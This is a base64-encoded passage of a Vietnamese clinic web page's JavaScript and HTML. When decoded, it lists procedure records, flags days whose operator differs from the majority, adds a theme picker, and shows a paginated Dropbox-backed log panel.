WxsSGVyYnMuZm9yRWFjaChoPT57DQogICAgY29uc3QgbSA9IG1ham9yaXR5W2guZGF0ZV07DQogICAgY29uc3QgaGFzTWFqb3JpdHkgPSBtICYmIG0udG9wTm9ybSAmJiBtLnRvcENvdW50ID4gbS5zZWNvbmRDb3VudDsNCiAgICBpZihoYXNNYWpvcml0eSAmJiBoLm9wTm9ybSAhPT0gbS50b3BOb3JtKXsNCiAgICAgIGRhdGVzLmFkZChoLmRhdGUpOw0KICAgIH0NCiAgfSk7DQoNCiAgcmV0dXJuIEFycmF5LmZyb20oZGF0ZXMpOw0KfQ0KDQp3aW5kb3cucmVuZGVySGVyYkxpc3QgPSBmdW5jdGlvbigpew0KICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVGFibGVCb2R5Jyk7DQogIGNvbnN0IGRhdGVGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRhdGVGaWx0ZXInKTsNCiAgY29uc3QgZG9jdG9yRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJEb2N0b3JGaWx0ZXInKTsNCiAgY29uc3Qgc3VtbWFyeURpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllclN1bW1hcnknKTsNCiAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbCcpOw0KICBjb25zdCBtb2RhbEJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbEJvZHknKTsNCiAgY29uc3QgbW9kYWxJbmZvID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWxJbmZvJyk7DQogIGNvbnN0IG9ubHlFcnJvckRheXNDYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93SGVyYkVycm9yRGF5c0NoZWNrYm94Jyk7DQoNCiAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgY29uc3QgaGVyYnNSYXcgPSB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW107DQogIGxldCBoZXJicyA9IGhlcmJzUmF3Lm1hcChoPT4oew0KICAgIC4uLmgsDQogICAgb3BDbGVhbjogY2xlYW5EaXNwbGF5KGgub3BlcmF0b3IpLA0KICAgIG9wTm9ybTogbm9ybShoLm9wZXJhdG9yKQ0KICB9KSk7DQoNCiAgLy8gbuG6v3UgY2hlY2tib3ggYuG6rXQgdGjDrCBs4buNYyBs4bqhaSBoZXJicyBjaOG7iSBjw7JuIG5o4buvbmcgbmfDoHkgY8OzIGzhu5dpDQogIGlmKG9ubHlFcnJvckRheXNDYiAmJiBvbmx5RXJyb3JEYXlzQ2IuY2hlY2tlZCl7DQogICAgY29uc3QgZXJyb3JEYXRlcyA9IGdldEhlcmJFcnJvckRhdGVzKGhlcmJzKTsNCiAgICBoZXJicyA9IGhlcmJzLmZpbHRlcihoID0+IGVycm9yRGF0ZXMuaW5jbHVkZXMoaC5kYXRlKSk7DQogICAgaWYoc3VtbWFyeURpdil7DQogICAgICBpZihlcnJvckRhdGVzLmxlbmd0aCl7DQogICAgICAgIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MID0gYDxiPsSQYW5nIGhp4buDbiB0aOG7iyBjw6FjIG5nw6B5IGPDsyBs4buXaSBz4bqvYyB0aHXhu5FjOjwvYj4gJHtlcnJvckRhdGVzLmpvaW4oJywgJyl9YDsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUwgPSAnJzsNCiAgICAgIH0NCiAgICB9DQogIH0NCg0KICAvLyBraOG7n2kgdOG6oW8gc2VsZWN0IG7hur91IGNoxrBhDQogIGlmKCFkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQpew0KICAgIGNvbnN0IHVuaXF1ZURhdGVzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGg9PmguZGF0ZSkpXS5zb3J0KChhLGIpPT57DQogICAgICBjb25zdCBbZGEsbWEseWFdID0gYS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgY29uc3QgW2RiLG1iLHliXSA9IGIuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgIHJldHVybiBuZXcgRGF0ZSh5YSxtYS0xLGRhKSAtIG5ldyBEYXRlKHliLG1iLTEsZGIpOw0KICAgIH0pOw0KICAgIGNvbnN0IHVuaXF1ZURvY3RvcnMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaD0+aC5kb2N0b3J8fCdLaMO0bmcgY8OzJykpXS5zb3J0KCk7DQogICAgZGF0ZUZpbHRlci5pbm5lckhUTUwgPQ0KICAgICAgJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgdW5pcXVlRGF0ZXMubWFwKGQ9PmA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgZG9jdG9yRmlsdGVyLmlubmVySFRNTCA9DQogICAgICAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjIGLDoWMgc8SpPC9vcHRpb24+JyArDQogICAgICB1bmlxdWVEb2N0b3JzLm1hcChkPT5gPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIGRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCA9ICd0cnVlJzsNCiAgICBkYXRlRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCk7DQogICAgZG9jdG9yRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCk7DQogICAgaWYob25seUVycm9yRGF5c0NiKXsNCiAgICAgIG9ubHlFcnJvckRheXNDYi5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB3aW5kb3cucmVuZGVySGVyYkxpc3QpOw0KICAgIH0NCiAgfQ0KDQogIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRhdGVGaWx0ZXIudmFsdWU7DQogIGNvbnN0IHNlbGVjdGVkRG9jdG9yID0gZG9jdG9yRmlsdGVyLnZhbHVlOw0KDQogIGNvbnN0IGZpbHRlcmVkID0gaGVyYnMuZmlsdGVyKHAgPT4NCiAgICAoc2VsZWN0ZWREYXRlID09PSAnYWxsJyB8fCBwLmRhdGUgPT09IHNlbGVjdGVkRGF0ZSkgJiYNCiAgICAoc2VsZWN0ZWREb2N0b3IgPT09ICdhbGwnIHx8IHAuZG9jdG9yID09PSBzZWxlY3RlZERvY3RvcikNCiAgKTsNCg0KICBpZihmaWx0ZXJlZC5sZW5ndGggPT09IDApew0KICAgIGNvbnN0IHRyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICB0ci5jbGFzc05hbWUgPSAnaGVyYi1yb3cnOw0KICAgIHRyLmlubmVySFRNTCA9ICc8dGQgY29sc3Bhbj0iNSI+PGNlbnRlcj5LaMO0bmcgY8OzIGThu68gbGnhu4d1IHPhuq9jIHRodeG7kWMgdGhhbmc8L2NlbnRlcj48L3RkPic7DQogICAgdGJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICAgIGlmKHN1bW1hcnlEaXYpIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheT0nbm9uZSc7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgY29uc3QgbWFqb3JpdHkgPSBjb21wdXRlTWFqb3JpdHlCeURhdGUoaGVyYnMpOw0KICBjb25zdCBvdXRsaWVyc0luVmlldyA9IFtdOw0KDQogIGZpbHRlcmVkLmZvckVhY2gocD0+ew0KICAgIGNvbnN0IHRyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICB0ci5jbGFzc05hbWUgPSAnaGVyYi1yb3cnOw0KICAgIGNvbnN0IG0gPSBtYWpvcml0eVtwLmRhdGVdOw0KICAgIGNvbnN0IGhhc01ham9yaXR5ID0gbSAmJiBtLnRvcE5vcm0gJiYgbS50b3BDb3VudCA+IG0uc2Vjb25kQ291bnQ7DQogICAgaWYoaGFzTWFqb3JpdHkgJiYgcC5vcE5vcm0gIT09IG0udG9wTm9ybSl7DQogICAgICB0ci5jbGFzc0xpc3QuYWRkKCdoZXJiLW91dGxpZXInKTsNCiAgICAgIG91dGxpZXJzSW5WaWV3LnB1c2gocCk7DQogICAgfQ0KICAgIHRyLmlubmVySFRNTCA9IGANCiAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9PC90ZD4NCiAgICAgIDx0ZD4ke3AucHJvY2VkdXJlfTwvdGQ+DQogICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSAmcmFycjsgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgIDx0ZD4ke3Aub3BDbGVhbn08L3RkPg0KICAgIGA7DQogICAgdGJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICB9KTsNCg0KICBpZihzdW1tYXJ5RGl2ICYmICghb25seUVycm9yRGF5c0NiIHx8ICFvbmx5RXJyb3JEYXlzQ2IuY2hlY2tlZCkpew0KICAgIGlmKG91dGxpZXJzSW5WaWV3Lmxlbmd0aCl7DQogICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J2Jsb2NrJzsNCiAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MID0NCiAgICAgICAgYDxhIGhyZWY9IiMiIGlkPSJoZXJiT3V0bGllckNvdW50TGluayI+Q8OzICR7b3V0bGllcnNJblZpZXcubGVuZ3RofSBjYSBjw7MgduG6pW4gxJHhu4EgdHJvbmcgZGFuaCBzw6FjaCBuw6B5LjwvYT5gOw0KICAgICAgY29uc3QgbGluayA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckNvdW50TGluaycpOw0KICAgICAgbGluay5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKGV2KXsNCiAgICAgICAgZXYucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgaWYobW9kYWxCb2R5KXsNCiAgICAgICAgICBtb2RhbEJvZHkuaW5uZXJIVE1MID0gJyc7DQogICAgICAgICAgb3V0bGllcnNJblZpZXcuZm9yRWFjaChwPT57DQogICAgICAgICAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICB0ci5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9PC90ZD4NCiAgICAgICAgICAgICAgPHRkPiR7cC5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgICAgPHRkPiR7cC5kYXRlfTwvdGQ+DQogICAgICAgICAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSAmcmFycjsgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgICAgICAgICAgPHRkPiR7cC5vcENsZWFufTwvdGQ+DQogICAgICAgICAgICBgOw0KICAgICAgICAgICAgbW9kYWxCb2R5LmFwcGVuZENoaWxkKHRyKTsNCiAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KICAgICAgICBpZihtb2RhbEluZm8pew0KICAgICAgICAgIGNvbnN0IG5vdGVEYXRlID0gKHNlbGVjdGVkRGF0ZT09PSdhbGwnKSA/ICduaGnhu4F1IG5nw6B5JyA6IHNlbGVjdGVkRGF0ZTsNCiAgICAgICAgICBtb2RhbEluZm8udGV4dENvbnRlbnQgPSBgVOG7lW5nICR7b3V0bGllcnNJblZpZXcubGVuZ3RofSBjYSBraMOhYyDEkWEgc+G7kSAoJHtub3RlRGF0ZX0pLmA7DQogICAgICAgIH0NCiAgICAgICAgaWYobW9kYWwpIG1vZGFsLnN0eWxlLmRpc3BsYXk9J2Jsb2NrJzsNCiAgICAgIH0sIHtvbmNlOnRydWV9KTsNCiAgICB9IGVsc2Ugew0KICAgICAgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MPScnOw0KICAgIH0NCiAgfQ0KfTsNCg0KDQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKT0+ew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJQcm9jZWR1cmVUYWJsZScpOw0KICAgIGlmKHRhYmxlICYmIHRhYmxlLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJyl7DQogICAgICB3aW5kb3cucmVuZGVySGVyYkxpc3QoKTsNCiAgICB9DQogIH0pOw0KfSkoKTsNCg0KDQoNCg0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24gKCkgew0KICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCiAgICBjb25zdCBhbmFseXplQnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKTsNCiAgICBpZiAoZmlsZUlucHV0ICYmIGFuYWx5emVCdG4pIHsNCiAgICAgIGZpbGVJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAgICAgIGFuYWx5emVCdG4uY2xpY2soKTsNCiAgICAgIH0pOw0KICAgIH0NCiAgfSk7DQo8L3NjcmlwdD4NCg0KDQo8IS0tIFRIRU1FIFBJQ0tFUiBTQ1JJUFQgLS0+DQo8c2NyaXB0Pg0KKGZ1bmN0aW9uKCl7DQogIGNvbnN0IFRIRU1FX0tFWSA9ICd1aUFjY2VudFRoZW1lJzsNCiAgY29uc3QgYm9keSA9IGRvY3VtZW50LmJvZHk7DQogIGNvbnN0IHBpY2tlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aGVtZVBpY2tlcicpOw0KICBpZighcGlja2VyKSByZXR1cm47DQogIGZ1bmN0aW9uIGFwcGx5VGhlbWUodCl7DQogICAgYm9keS5jbGFzc0xpc3QucmVtb3ZlKCd0aGVtZS1kZWZhdWx0JywndGhlbWUtb3JhbmdlJywndGhlbWUtcmVkJywndGhlbWUtZ3JlZW4nKTsNCiAgICBpZih0ICYmIHQgIT09ICdkZWZhdWx0Jyl7DQogICAgICBib2R5LmNsYXNzTGlzdC5hZGQoJ3RoZW1lLScrdCk7DQogICAgfSBlbHNlIHsNCiAgICAgIGJvZHkuY2xhc3NMaXN0LmFkZCgndGhlbWUtZGVmYXVsdCcpOyAvLyBleHBsaWNpdCDEkeG7gyBhY3RpdmUgcmluZw0KICAgIH0NCiAgICBwaWNrZXIucXVlcnlTZWxlY3RvckFsbCgnLnRoZW1lLXN3YXRjaCcpLmZvckVhY2goYnRuPT57DQogICAgICBidG4uY2xhc3NMaXN0LnRvZ2dsZSgnaXMtYWN0aXZlJywgYnRuLmRhdGFzZXQudGhlbWU9PT10IHx8ICh0PT09JycgJiYgYnRuLmRhdGFzZXQudGhlbWU9PT0nZGVmYXVsdCcpKTsNCiAgICB9KTsNCiAgICB0cnl7IGxvY2FsU3RvcmFnZS5zZXRJdGVtKFRIRU1FX0tFWSx0fHwnZGVmYXVsdCcpOyB9Y2F0Y2goZSl7fQ0KICB9DQogIGNvbnN0IHNhdmVkID0gKGZ1bmN0aW9uKCl7dHJ5e3JldHVybiBsb2NhbFN0b3JhZ2UuZ2V0SXRlbShUSEVNRV9LRVkpIHx8ICdkZWZhdWx0Jzt9Y2F0Y2goZSl7cmV0dXJuICdkZWZhdWx0Jzt9fSkoKTsNCiAgYXBwbHlUaGVtZShzYXZlZCk7DQogIHBpY2tlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZT0+ew0KICAgIGNvbnN0IGJ0biA9IGUudGFyZ2V0LmNsb3Nlc3QoJy50aGVtZS1zd2F0Y2gnKTsNCiAgICBpZighYnRuKSByZXR1cm47DQogICAgYXBwbHlUaGVtZShidG4uZGF0YXNldC50aGVtZSk7DQogIH0pOw0KfSkoKTsNCjwvc2NyaXB0Pg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gdXBkYXRlSGVyYkJ1dHRvbldpdGhPdXRsaWVyQ291bnQoKSB7DQogIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVG9nZ2xlQnRuJyk7DQogIGlmICghYnRuIHx8ICF3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMpIHJldHVybjsNCg0KICBjb25zdCBoZXJicyA9IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlczsNCiAgY29uc3QgY291bnRzID0ge307DQoNCiAgaGVyYnMuZm9yRWFjaChoID0+IHsNCiAgICBjb25zdCBkYXRlID0gaC5kYXRlOw0KICAgIGNvbnN0IGtleSA9IGRhdGU7DQogICAgaWYgKCFjb3VudHNba2V5XSkgY291bnRzW2tleV0gPSB7fTsNCiAgICBjb25zdCBuYW1lID0gKGgub3BlcmF0b3IgfHwgJ0tow7RuZyBjw7MnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCiAgICBjb3VudHNba2V5XVtuYW1lXSA9IChjb3VudHNba2V5XVtuYW1lXSB8fCAwKSArIDE7DQogIH0pOw0KDQogIGxldCBvdXRsaWVyQ291bnQgPSAwOw0KDQogIE9iamVjdC5rZXlzKGNvdW50cykuZm9yRWFjaChkYXRlID0+IHsNCiAgICBjb25zdCBvcHMgPSBjb3VudHNbZGF0ZV07DQogICAgY29uc3QgZW50cmllcyA9IE9iamVjdC5lbnRyaWVzKG9wcykuc29ydCgoYSwgYikgPT4gYlsxXSAtIGFbMV0pOw0KICAgIGNvbnN0IHRvcCA9IGVudHJpZXNbMF07DQogICAgaWYgKCF0b3ApIHJldHVybjsNCg0KICAgIGNvbnN0IHRvcE5hbWUgPSB0b3BbMF07DQogICAgY29uc3QgdG9wQ291bnQgPSB0b3BbMV07DQoNCiAgICBmb3IgKGNvbnN0IFtuYW1lLCBjb3VudF0gb2YgZW50cmllcykgew0KICAgICAgaWYgKG5hbWUgIT09IHRvcE5hbWUgJiYgY291bnQgPiAwKSB7DQogICAgICAgIG91dGxpZXJDb3VudCArPSBjb3VudDsNCiAgICAgIH0NCiAgICB9DQogIH0pOw0KDQpidG4uaW5uZXJIVE1MID0gYFPhuq9jIHRodeG7kWMgdGhhbmcgPGkgY2xhc3M9ImZhLXNvbGlkIGZhLXRyaWFuZ2xlLWV4Y2xhbWF0aW9uIiBzdHlsZT0iY29sb3I6eWVsbG93Ij48L2k+IDxzcGFuIHN0eWxlPSJjb2xvcjp5ZWxsb3c7IGZvbnQtd2VpZ2h0OmJvbGQiPigke291dGxpZXJDb3VudH0pPC9zcGFuPmA7DQoNCg0KfQ0KPC9zY3JpcHQ+DQo8ZGl2IGlkPSJkcm9wYm94UGFuZWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7IHBvc2l0aW9uOmZpeGVkOyBpbnNldDowOyBiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTsgei1pbmRleDo5OTk5OyI+DQogIDxkaXYgc3R5bGU9Im1hcmdpbjo1JSBhdXRvOyBiYWNrZ3JvdW5kOiNmZmY7IHBhZGRpbmc6MjBweDsgbWF4LXdpZHRoOjkwJTsgYm9yZGVyLXJhZGl1czoxMHB4OyBtYXgtaGVpZ2h0Ojgwdmg7IG92ZXJmbG93OmF1dG8iPg0KICAgPGRpdiBzdHlsZT0iZGlzcGxheTogZmxleDsganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuOyBhbGlnbi1pdGVtczogY2VudGVyOyI+DQogIDxoMz7wn5OCIERhbmggc8OhY2ggS2hvYSDEkcOjIHPhu60gZOG7pW5nIHBo4bqnbiBt4buBbTwvaDM+DQogIDxidXR0b24gY2xhc3M9ImJ0biJvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhbmVsJykuc3R5bGUuZGlzcGxheT0nbm9uZScic3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7IGZvbnQtc2l6ZToxM3B4OyBib3JkZXItcmFkaXVzOjRweDsiPg0KICAgIMSQw7NuZw0KICA8L2J1dHRvbj4NCjwvZGl2Pg0KPCEtLSBQYWdpbmF0aW9uIGNvbnRyb2xzIC0tPg0KPGRpdiBpZD0iZHJvcGJveFBhZ2VyIiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6OHB4O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO21hcmdpbi10b3A6MTJweCI+DQogIDxkaXY+DQogICAgSGnhu4NuIHRo4buLDQogICAgPHNlbGVjdCBpZD0iZHJvcGJveFBhZ2VTaXplIiBzdHlsZT0icGFkZGluZzo2cHggOHB4O2JvcmRlcjoxcHggc29saWQgI2RkZDtib3JkZXItcmFkaXVzOjZweCI+DQogICAgICA8b3B0aW9uIHZhbHVlPSIxMCIgc2VsZWN0ZWQ+MTA8L29wdGlvbj4NCiAgICAgIDxvcHRpb24gdmFsdWU9IjIwIj4yMDwvb3B0aW9uPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iNTAiPjUwPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogICAgZMOybmcgLyB0cmFuZw0KICA8L2Rpdj4NCg0KICA8ZGl2IGlkPSJkcm9wYm94UGFnZUJ1dHRvbnMiIHN0eWxlPSJkaXNwbGF5OmZsZXg7Z2FwOjZweDtmbGV4LXdyYXA6d3JhcCI+PC9kaXY+DQoNCiAgPGRpdiBpZD0iZHJvcGJveFBhZ2VJbmZvIiBzdHlsZT0ibWluLXdpZHRoOjE3MHB4O3RleHQtYWxpZ246cmlnaHQiPjwvZGl2Pg0KPC9kaXY+DQogICAgPHRhYmxlIGJvcmRlcj0iMSIgY2VsbHBhZGRpbmc9IjgiIHN0eWxlPSJ3aWR0aDoxMDAlOyBib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7IGZvbnQtc2l6ZToxNHB4Ij4NCiAgICAgIDx0aGVhZD4NCiAgICAgICAgPHRyPg0KICAgICAgICAgIDx0aD5TVFQ8L3RoPg0KICAgICAgICAgIDx0aD5Uw6puIGtob2E8L3RoPg0KICAgICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgICAgPHRoPlPhuq9jIHRodeG7kWM8L3RoPg0KICAgICAgICAgPHRoPlNhaSB0aOG7nWkgZ2lhbjwvdGg+DQogICAgICAgPHRoPlRyw7luZyBnaeG7nTwvdGg+DQogICAgICAgDQogICAgICAgICAgPHRoPlRo4budaSBnaWFuPC90aD4NCgkJICA8dGg+TGluazwvdGg+DQoJCSAgPHRoPlhvw6E8L3RoPg0KICAgICAgICA8L3RyPg0KICAgICAgPC90aGVhZD4NCiAgICAgIDx0Ym9keSBpZD0iZHJvcGJveEZpbGVMaXN0Ij48L3Rib2R5Pg0KICAgIDwvdGFibGU+DQogIA0KICA8L2Rpdj4NCjwvZGl2PjxzY3JpcHQ+DQphc3luYyBmdW5jdGlvbiBzaG93RHJvcGJveFBhbmVsKCkgew0KYXdhaXQgZW5zdXJlRHJvcGJveCgpOyAvLyDEkeG6o20gYuG6o28gY8OzIERyb3Bib3ggU0RLDQoNCiAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hGaWxlTGlzdCcpOw0KDQogIC8vIEhp4buHbiBwb3B1cCBuZ2F5IGzhuq1wIHThu6ljIHbhu5tpIHRy4bqhbmcgdGjDoWkgbG9hZGluZw0KICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI5IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOmJsdWU7Ij4NCiAgICDEkGFuZyB04bqjaSBk4buvIGxp4buHdS4uLg0KICA8L3RkPjwvdHI+YDsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYW5lbCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KDQogIHRyeSB7DQogICAgLy8gMSkgS2nhu4NtIHRyYSB04buTbiB04bqhaSBsb2cuanNvbg0KICAgIGxldCBoYXNMb2cgPSBmYWxzZTsNCiAgICBsZXQgcmVzID0gYXdhaXQgZGJ4LmZpbGVzTGlzdEZvbGRlcih7IHBhdGg6ICcvdGh1dGh1YXQnIH0pOw0KICAgIHdoaWxlICh0cnVlKSB7DQogICAgICBpZiAocmVzLnJlc3VsdD8uZW50cmllcz8uc29tZShlID0+IGVbJy50YWcnXSA9PT0gJ2ZpbGUnICYmIGUubmFtZSA9PT0gJ2xvZy5qc29uJykpIHsNCiAgICAgICAgaGFzTG9nID0gdHJ1ZTsNCiAgICAgICAgYnJlYWs7DQogICAgICB9DQogICAgICBpZiAoIXJlcy5yZXN1bHQ/Lmhhc19tb3JlKSBicmVhazsNCiAgICAgIHJlcyA9IGF3YWl0IGRieC5maWxlc0xpc3RGb2xkZXJDb250aW51ZSh7IGN1cnNvcjogcmVzLnJlc3VsdC5jdXJzb3IgfSk7DQogICAgfQ0KDQogICAgLy8gMikgTuG6v3Uga2jDtG5nIGPDsyBmaWxlIOKGkiBj4bqtcCBuaOG6rXQgbuG7mWkgZHVuZw0KICAgIGlmICghaGFzTG9nKSB7DQogICAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgICBLaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1DQogICAgICA8L3RkPjwvdHI+YDsNCiAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyAzKSBDw7MgZmlsZSDihpIgdOG6o2kgdsOgIGhp4buDbiB0aOG7iw0KICAgIGNvbnN0IGRsID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiAnL3RodXRodWF0L2xvZy5qc29uJyB9KTsNCiAgICBjb25zdCB0ZXh0ID0gYXdhaXQgZGwucmVzdWx0LmZpbGVCbG9iLnRleHQoKTsNCiAgICBsZXQgbG9ncyA9IFtdOw0KICAgIHRyeSB7IGxvZ3MgPSBKU09OLnBhcnNlKHRleHQpOyB9IGNhdGNoIHsgbG9ncyA9IFtdOyB9DQoNCiAgICBpZiAoIWxvZ3MubGVuZ3RoKSB7DQogICAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgICBLaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1DQogICAgICA8L3RkPjwvdHI+YDsNCiAgICB9IGVsc2Ugew0KIGNvbnN0IGN1cnJlbnRVc2VyID0gKHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSB8fCAnJykudG9Mb3dlckNhc2UoKTsNCg0KLy8gUmVuZGVyIG3hu5tpIOKAkyBnaWFvIGNobyBi4buZIHBow6JuIHRyYW5nOg0KREJfTE9HUyA9IGxvZ3M7IC8vIG3huqNuZyBk4buvIGxp4buHdSDEkeG6p3kgxJHhu6cNCkRCX1BBR0UgPSAxOyAgICAvLyB24buBIHRyYW5nIDEgbeG7l2kga2hpIG3hu58gcGFuZWwNCkRCX0NVUlJFTlRfVVNFUiA9IChzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJykgfHwgJycpLnRvTG93ZXJDYXNlKCk7DQoNCmF0dGFjaFBhZ2VyRXZlbnRzT25jZSgpOyAvLyBn4bqvbiBjaGFuZ2UgY2hvIHNlbGVjdCBwYWdlIHNpemUgKGNo4buJIDEgbOG6p24pDQpyZW5kZXJEcm9wYm94UGFnZSgpOyAgICAgLy8gduG6vSB0Ym9keSArIG7DunQgdHJhbmcgdOG7qyBEQl9MT0dTDQogICAgfQ0KICB9IGNhdGNoIChlcnIpIHsNCiAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHhu41jIGRhbmggc8OhY2ggdOG7qyBEcm9wYm94OicsIGVycik7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleH